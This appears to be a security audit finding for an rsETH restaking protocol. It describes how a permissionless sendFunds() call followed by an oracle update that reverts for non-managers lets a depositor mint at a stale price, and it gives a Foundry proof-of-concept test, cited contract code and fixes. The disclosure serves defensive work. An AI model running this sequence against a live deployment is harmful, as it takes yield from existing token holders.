### Title
Unpermissioned `sendFunds()` + `updateRSETHPrice()` Sequence Enables Theft of Unclaimed MEV Yield via Oracle Price-Threshold Lock — (`contracts/FeeReceiver.sol`, `contracts/LRTOracle.sol`)

---

### Summary

`FeeReceiver.sendFunds()` carries no access control and can be called by any address to flush accumulated MEV/EL rewards into `LRTDepositPool`. Because `LRTDepositPool.getETHDistributionData()` counts `address(this).balance` directly, the deposit pool's ETH balance—and therefore the oracle's computed TVL—rises immediately. If the accumulated rewards are large enough, the subsequent public call to `LRTOracle.updateRSETHPrice()` reverts with `PriceAboveDailyThreshold()` for every non-manager caller, locking the oracle. During the lock window the rsETH price is stale (below actual), allowing the attacker to deposit at the artificially low price and capture yield that belongs to existing holders.

---

### Finding Description

**Step 1 — Unpermissioned reward flush**

`FeeReceiver.sendFunds()` has no role guard:

```solidity
function sendFunds() external {                          // no modifier
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
``` [1](#0-0) 

`receiveFromRewardReceiver` is equally unguarded:

```solidity
function receiveFromRewardReceiver() external payable { }
``` [2](#0-1) 

**Step 2 — ETH balance immediately reflected in TVL**

`getETHDistributionData()` uses the raw balance of the deposit pool:

```solidity
ethLyingInDepositPool = address(this).balance;
``` [3](#0-2) 

`_getTotalEthInProtocol()` in the oracle calls `getTotalAssetDeposits(ETH)` → `getETHDistributionData()`, so the flushed ETH is immediately part of `totalETHInProtocol`. [4](#0-3) 

**Step 3 — Public oracle update reverts for non-managers**

`updateRSETHPrice()` is public with no role check:

```solidity
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
``` [5](#0-4) 

Inside `_updateRsETHPrice()`, if the computed price exceeds `highestRsethPrice` by more than `pricePercentageLimit`, any non-manager caller is reverted:

```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

if (isPriceIncreaseOffLimit) {
    if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
        revert PriceAboveDailyThreshold();
    }
}
``` [6](#0-5) 

The price is **not written** when the function reverts, so `rsETHPrice` stays at its pre-flush value. Only the manager can escape via `updateRSETHPriceAsManager()`. [7](#0-6) 

**Step 4 — Attacker deposits at stale (below-actual) price**

With the oracle locked, `rsETHPrice` is lower than the true backing per token. `getRsETHAmountToMint` divides by the stale `rsETHPrice`:

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [8](#0-7) 

The attacker receives more rsETH than the actual backing warrants, diluting existing holders' share of the MEV rewards that were just flushed.

---

### Impact Explanation

The MEV/EL rewards accumulated in `FeeReceiver` represent unclaimed yield owed to existing rsETH holders (they raise the per-token backing). By flushing those rewards and simultaneously locking the oracle, an attacker can deposit at the pre-flush price and claim a disproportionate share of that yield when the manager eventually updates the price. Existing holders' rsETH is diluted by exactly the amount the attacker over-minted. This is a direct, quantifiable theft of unclaimed yield.

---

### Likelihood Explanation

- `sendFunds()` and `updateRSETHPrice()` are both permissionless and callable in consecutive transactions.
- MEV rewards naturally accumulate between keeper calls; a single large batch (e.g., after a missed keeper run or a high-MEV block sequence) can exceed the `pricePercentageLimit` in one flush.
- The attacker needs no capital beyond the deposit amount and no privileged access.
- The attack window lasts until the manager notices and calls `updateRSETHPriceAsManager()`, which may be minutes to hours depending on monitoring.

---

### Recommendation

1. **Add access control to `sendFunds()`** — restrict it to `MANAGER` or a dedicated keeper role so that the timing of reward flushes is controlled.
2. **Or batch the flush with the oracle update** — require that `sendFunds()` atomically calls `updateRSETHPrice()` (manager-gated), so the price is always updated in the same transaction as the flush.
3. **Alternatively, cap the single-flush amount** — allow partial flushes so that no single call can push the price above the threshold.
4. **Emit an alert / auto-pause on threshold breach** rather than silently reverting for non-managers, so monitoring systems detect the condition immediately.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Foundry fork test (mainnet fork or local deployment)
contract ExploitTest is Test {
    FeeReceiver feeReceiver;
    LRTOracle   oracle;
    LRTDepositPool pool;
    RSETH       rseth;

    address attacker = address(0xBEEF);

    function setUp() public {
        // ... deploy/fork protocol with pricePercentageLimit = 1e16 (1%)
        // Fund FeeReceiver with enough ETH to exceed 1% of TVL
        vm.deal(address(feeReceiver), LARGE_MEV_AMOUNT);
    }

    function testOracleLock() public {
        uint256 priceBefore = oracle.rsETHPrice();

        // Step 1: flush MEV rewards — permissionless
        feeReceiver.sendFunds();

        // Step 2: deposit at stale price
        vm.startPrank(attacker);
        vm.deal(attacker, 10 ether);
        pool.depositETH{value: 10 ether}(0, "");
        uint256 rsethBefore = rseth.balanceOf(attacker);

        // Step 3: lock the oracle for non-managers
        vm.expectRevert(LRTOracle.PriceAboveDailyThreshold.selector);
        oracle.updateRSETHPrice();
        vm.stopPrank();

        // Step 4: manager unlocks
        vm.prank(manager);
        oracle.updateRSETHPriceAsManager();

        uint256 priceAfter = oracle.rsETHPrice();
        assertGt(priceAfter, priceBefore); // price jumped

        // Attacker's rsETH is now worth more than they paid
        uint256 attackerValueAfter = rseth.balanceOf(attacker) * priceAfter / 1e18;
        assertGt(attackerValueAfter, 10 ether); // profit from stolen yield
    }
}
```

### Citations

**File:** contracts/FeeReceiver.sol (L53-58)
```text
    function sendFunds() external {
        uint256 balance = address(this).balance;
        ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();

        emit MevRewardsAddedToTVL(balance);
    }
```

**File:** contracts/LRTDepositPool.sol (L61-61)
```text
    function receiveFromRewardReceiver() external payable { }
```

**File:** contracts/LRTDepositPool.sol (L480-480)
```text
        ethLyingInDepositPool = address(this).balance;
```

**File:** contracts/LRTDepositPool.sol (L520-520)
```text
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L94-96)
```text
    function updateRSETHPriceAsManager() external onlyLRTManager {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L256-266)
```text
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
```

**File:** contracts/LRTOracle.sol (L331-348)
```text
    function _getTotalEthInProtocol() private view returns (uint256 totalETHInProtocol) {
        address lrtDepositPoolAddr = lrtConfig.getContract(LRTConstants.LRT_DEPOSIT_POOL);
        address[] memory supportedAssets = lrtConfig.getSupportedAssetList();
        uint256 supportedAssetCount = supportedAssets.length;

        for (uint16 assetIdx; assetIdx < supportedAssetCount;) {
            address asset = supportedAssets[assetIdx];
            // assetER is in 1e18 precision (1.0 = 1e18)
            uint256 assetER = getAssetPrice(asset);
            // totalAssetAmt is in 1e18 precision (standard token decimals)
            uint256 totalAssetAmt = ILRTDepositPool(lrtDepositPoolAddr).getTotalAssetDeposits(asset);

            totalETHInProtocol += totalAssetAmt.mulWad(assetER);

            unchecked {
                ++assetIdx;
            }
        }
```
